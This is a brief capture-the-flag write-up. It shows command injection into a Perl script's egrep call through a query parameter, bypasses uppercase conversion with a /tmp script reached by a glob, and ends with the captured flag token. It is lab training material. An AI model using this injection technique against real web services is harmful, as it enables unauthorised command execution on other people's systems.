>   @output = `egrep "^$xx" /tmp/xd 2>&1`;

we can inject a command here via the query params
we just need to prepare a binary in uppercase with the following code the get the flag


in /tmp create a file in uppercase (here XD)
`touch /tmp/XD`

> #!/bin/sh
>
> getflag > /tmp/ok

then curl the http server with
`curl "localhost:4646/?x=\$(/*/XD)"`

> Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
